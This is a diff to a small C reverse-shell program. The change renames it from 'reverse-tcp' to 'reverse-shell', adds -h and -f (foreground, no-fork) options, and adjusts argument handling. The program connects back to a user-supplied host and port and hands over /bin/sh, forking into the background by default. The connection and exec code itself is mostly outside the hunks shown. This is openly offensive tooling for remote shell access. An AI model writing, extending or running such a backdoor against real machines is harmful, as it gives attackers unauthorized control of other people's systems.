@@ -7,7 +7,7 @@
 #include <sys/socket.h>
 
 
-#define PROGNAME	"reverse-tcp"
+#define PROGNAME	"reverse-shell"
 #define SHELL		"sh"
 #define PATH		"/bin"
 #define PATHSHELL	PATH "/" SHELL
@@ -15,7 +15,10 @@
 
 static void usage()
 {
-	fprintf(stderr, "usage: %s <host> <port>\n", PROGNAME);
+	fprintf(stderr, "usage: %s [options] <host> <port>\n", PROGNAME);
+	fprintf(stderr, "options:\n");
+	fprintf(stderr, "\t-h : display this and exit\n");
+	fprintf(stderr, "\t-f : foreground mode (eg: no fork)\n");
 }
 
 
@@ -25,7 +28,7 @@ static void reverse_tcp(const char *host, const char *port)
 	struct addrinfo	hints;
 	struct addrinfo	*res;
 	int		ret;
-	char		*ex[4];
+	char		*ex[3];
 
 	memset(&hints, 0, sizeof hints);
 	hints.ai_family = AF_INET;
@@ -59,9 +62,28 @@ static void reverse_tcp(const char *host, const char *port)
 
 int main(int argc, char *argv[])
 {
+	int	c;
+	int	nofork = 0;
 	pid_t	child;
 
-	if ( argc != 3 )
+	while ( (c = getopt(argc, argv, "hf")) != -1 )
+	{
+		switch ( c )
+		{
+			case 'h':
+			usage();
+			return 0;
+
+			case 'f':
+			nofork = 1;
+			break;
+		}
+	}
+
+	argv += optind;
+	argc -= optind;
+
+	if ( argc != 2 )
 	{
 		usage();
 		return -1;
@@ -69,8 +91,8 @@ int main(int argc, char *argv[])
 
 	/* Fork and connect back
 	 */
-	if ( (child = fork()) == 0 )
-		reverse_tcp(argv[1], argv[2]);
+	if ( nofork || (child = fork()) == 0 )
+		reverse_tcp(argv[0], argv[1]);
 	else
 		printf("child pid: %d\n", child);
 
